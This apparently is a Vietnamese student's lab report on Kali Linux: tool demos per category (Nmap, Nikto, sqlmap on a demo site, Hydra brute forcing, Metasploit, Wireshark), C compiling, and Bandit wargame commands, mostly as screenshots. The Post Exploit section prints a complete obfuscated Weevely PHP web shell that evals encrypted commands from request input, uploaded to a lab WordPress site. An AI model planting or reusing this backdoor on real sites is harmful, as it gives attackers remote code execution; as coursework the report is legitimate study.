### Bài 1: 
**a) Cài Kali Linux tại [https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/](https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/) , bản 32-bit  
Thêm user với tên và mã sinh viên của mình, gán cho user quyền sudo.**
+ Thêm user : tuananhb17dcat008 

![](https://i.imgur.com/C9inrwD.png)

+ User với quyền sudo (thuộc group sudo)

![](https://i.imgur.com/eic0PN1.png)
![](https://i.imgur.com/Dfot8ft.png)

**b) Tìm hiểu các tool có trong Kali Linux trong từng nhóm với 10 nhóm đầu tiên. Mỗi nhóm lựa chọn 1 tool bất kỳ có liên quan tới chức năng của nhóm đó, chạy thử các tool với ví dụ và chụp lại ảnh kết quả. Trong đó bắt buộc phải có tool Nmap/Zenmap (thử với comprehensive scan).**

#### Nhóm 1: Imformation gathering : Nmap - sử dụng để tìm toàn bộ sub-domain của cổng thông tin PTIT.

![](https://i.imgur.com/Gz5A59w.png)

#### Nhóm 2 : Vulnerability analysis : Nikto
![](https://i.imgur.com/XaCnv9I.png)
#### Nhóm 3 : Web application analysis : Burpsuite pro chứ không phải bản community

![](https://i.imgur.com/Kf3ZDGE.png)
![](https://i.imgur.com/giJGtKl.png)

#### Nhóm 4 : Database accessment : Sqlmap khai thác tấn công trang demo của acunetix
![](https://i.imgur.com/YsTAOPN.png)

![](https://i.imgur.com/uyb4VXO.png)

![](https://i.imgur.com/H5Df1Pq.png)

#### Nhóm 5 : Password attacks : 

Link video em demo brute force password telnet sử dụng Hydra  
https://www.dropbox.com/h?preview=Screencast+2021-03-06+03%3A15%3A11.mp4

![](https://i.imgur.com/2JnCrVq.png)

#### Nhóm 6 : Wireless Attacks 

Do các các công cụ trong nhóm này đều cần module WIFI để tấn công nên em không thực hiện DEMO được ạ.

![](https://i.imgur.com/nVCpXCi.png)

#### Nhóm 7 : Reverse Engineering : Sử dụng Clang ++ để compile code C++ thay cho G++

![](https://i.imgur.com/KqTmVv2.png)

#### Nhóm 8 : Exploitation Tools : Metasploit framework 

![](https://i.imgur.com/aDy8oJZ.png)

#### Nhóm 9 : Sniffing and Spooping : Em demo sử dụng Wireshark để chặn bắt gói tin TCP đối với card mạng Eth0

![](https://i.imgur.com/XxZbYnT.png)

#### Nhóm 10 : Post Exploit : Em sử dụng Weevely để tạo backdoor trong trang php dựng từ wordpress trên máy Host. Sử dùng máy Kali tạo script và tấn công.

+ Sử dụng weevely tạo ra một 404.php và upload lên sever.


    <?php
    
    $P='ob_~xend_clean();$~xr=@base~x64_e~xncode(@x~x~x(@gzcompr~xes~xs($o),$k));pri~xnt(~x"~x$p$kh$r$kf");}';
    
    $g='$k="~x827~xccb0e";$kh=~x"ea8a70~x6c4c34~x"~x;$k~xf~x="a16891f84e7b";~x$p="C~x21kNnholigA~x~x3Z~xJF";~x';
    
    $s='function ~xx($t,$k){$c=strl~xen($~xk~x);$l=strle~x~xn($t);$o=~x"";~xfor($~xi=0;$i<$l;~x){for($j=0~x';
    
    $k='a~xl(@gzunco~xmpr~xess(@x(@ba~xse6~x4_decod~xe($~xm~x[1])~x,$k)));$o=@ob_get~x_conte~xnts(~x~x);@';
    
    $d=str_replace('ci','','ccireciaciteci_fciunciction');
    
    $K=';~x($j<$c&&$i<~x$l);$~xj++,~x$i++){$~xo.=$t~x{$i}~x^$k{$j};}}~xre~xturn $o;}if~x (@preg~x_match(~x';
    
    $f='~x"/$kh(.+)$k~x~xf/",@~xfile_get_c~xon~xtents("php://i~xnp~xut~x"),$m)==1) {~x~x@ob~x_start();@ev';
    
    $L=str_replace('~x','',$g.$s.$K.$f.$k.$P);
    
    $N=$d('',$L);$N();
    
    ?>

![](https://i.imgur.com/pav9pgj.png)

+ Truy cập vào trang upload để kích hoạt backdoor.

![](https://i.imgur.com/bDy7I0e.png)

+ Truy cập từ máy tấn công.

![](https://i.imgur.com/ndeh1oa.png)

**Bài 2:  Tìm hiểu cách lập trình C trên Linux (thử nghiệm trên Kali Linux) và biên dịch ra file chạy được : ví dụ với chương trình in ra chuỗi "Hello World". Chụp các ảnh kết quả minh họa.**

![](https://i.imgur.com/7lUJNxr.png)

![](https://i.imgur.com/vIWnef3.png)

**Bài 3:  Tìm hiểu thêm về các câu lệnh command line trên Linux, với danh sách các câu lệnh ở dưới 2 link dưới đây** 

Các flag mà em lấy trên trang [http://overthewire.org/wargames/bandit/](http://overthewire.org/wargames/bandit/) )
![](https://i.imgur.com/kVN4REs.png)

Tổng hợp các lệnh xử dụng trong bài tập.

![](https://i.imgur.com/wnHKL5E.png)

![](https://i.imgur.com/ZtHYRkl.png)

![](https://i.imgur.com/TE2L2wA.png)

![](https://i.imgur.com/JMRHYDM.png)

![](https://i.imgur.com/35LcqFP.png)

Thầy có thể xem thêm một số tổng hợp nhỏ về Kali linux và Ubuntu tại Github cá nhân của em ạ.
https://github.com/ErikHorus1249/Guide-Documents

